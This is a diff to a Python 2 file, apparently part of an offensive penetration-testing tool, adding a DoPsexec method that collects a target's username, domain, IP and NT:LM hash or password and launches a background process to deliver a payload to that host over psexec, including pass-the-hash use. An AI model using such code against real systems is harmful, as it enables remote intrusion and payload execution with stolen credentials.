@@ -213,4 +213,30 @@ class FUNCTIONS(object):
         except Exception as E:
             print t.bold_red + '\n[*] Psexec Error!'
             print E
-            print '\n[*] Psexec May Have Worked' + t.nor
+            print '\n[*] Psexec May Have Worked' + t.normal
+
+    def DoPsexec(self,payloaddir,payloadname):
+        while True:
+            targethash = raw_input(
+                '[*] Targets NT:LM Hash or Plain Text Password:')
+            targetusername = raw_input('[*] Targets Username:')
+            targetdomain = raw_input('[*] Targets Domain:')
+            targetipaddr = raw_input('[*] Targets Ip Address:')
+            print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' + targetipaddr + t.normal
+            ispsexecdetailscorrect = raw_input(
+                '[*] Are These Details Correct? ([y]/n)')
+            if ispsexecdetailscorrect == 'y' or ispsexecdetailscorrect == '':
+                if re.search(':', targethash):
+                    print t.bold_green + '[*] NT:LM HASH DETECTED' + t.normal
+                    targetpassword = ''
+                else:
+                    print t.bold_green + '[*] CLEAR TEXT PASSWORD DETECTED' + t.normal
+                    targetpassword = targethash
+                    targethash = None
+                break
+            else:
+                continue
+        b = multiprocessing.Process(
+            target=self.ServePsexec, args=(payloaddir + '/' + payloadname, targethash, targetusername, targetdomain, targetipaddr, targetpassword))
+        b.daemon = True
+        b.start()
